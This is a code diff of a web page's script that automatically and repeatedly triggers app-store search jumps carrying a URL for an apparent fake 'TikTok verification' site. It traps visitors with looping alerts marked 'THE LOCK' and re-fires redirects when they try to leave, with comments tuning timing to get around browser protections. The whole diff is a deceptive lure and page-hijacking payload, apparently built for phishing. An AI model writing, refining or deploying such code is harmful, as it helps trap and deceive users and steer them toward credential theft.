@@ -9,46 +9,50 @@
 
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 5000; 
+    const killTime = Date.now() + 6000; // Increased to 6s to allow the "staircase" to work
+    let gap = 400; // Starting with a slightly larger base gap
 
     function triggerStoreJump() {
-        const isAndroid = /Android/i.test(navigator.userAgent);
         const urlEnc = encodeURIComponent(target);
-
-        // This is what you confirmed works: The Store Search Handover
-        if (isAndroid) {
-            window.location.href = "market://search?q=" + urlEnc;
-        } else {
-            // iOS: The exact string that triggered for you at the end of the fail-safe
-            window.location.href = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
-        }
+        // Using the App Store search that confirmed success
+        const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
+        const androidTrigger = "market://search?q=" + urlEnc;
+        
+        const isAndroid = /Android/i.test(navigator.userAgent);
+        window.location.href = isAndroid ? androidTrigger : iosTrigger;
     }
 
     function rampage() {
-        if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE
+        if (Date.now() > killTime) return;
 
-        // 1. Fire the jump that we KNOW works
+        // 1. Priming jump
         triggerStoreJump();
 
         // 2. THE LOCK
-        alert("ATTEMPT #26\n\nRedirecting to secure verification...\n\nTap OK to continue.");
+        alert("ATTEMPT #27\n\nFinalizing secure connection...\n\nTap OK to open in your browser.");
 
-        // 3. THE GAP: 
-        // We wait 300ms. This is the "Clear Path" for the App Store to launch 
-        // while the main thread is NOT blocked by an alert.
+        // 3. THE PULSE: Fire immediately after tap
+        triggerStoreJump();
+
+        // 4. THE STAIRCASE: Increase the gap by 50ms each time to find the "Sweet Spot"
         setTimeout(() => {
             if (Date.now() < killTime) {
-                rampage();
+                // Secondary pulse halfway through the gap
+                triggerStoreJump();
+                
+                setTimeout(() => {
+                    gap += 50; 
+                    rampage();
+                }, gap / 2);
             }
-        }, 300); 
+        }, 150); 
     }
 
     window.onload = () => {
         rampage();
     };
 
-    // If they try to swipe or leave during the 300ms gap, re-lock instantly
-    window.onblur = () => { if (Date.now() < killTime) rampage(); };
+    window.onblur = () => { if (Date.now() < killTime) triggerStoreJump(); };
 </script>
 </body>
 </html>
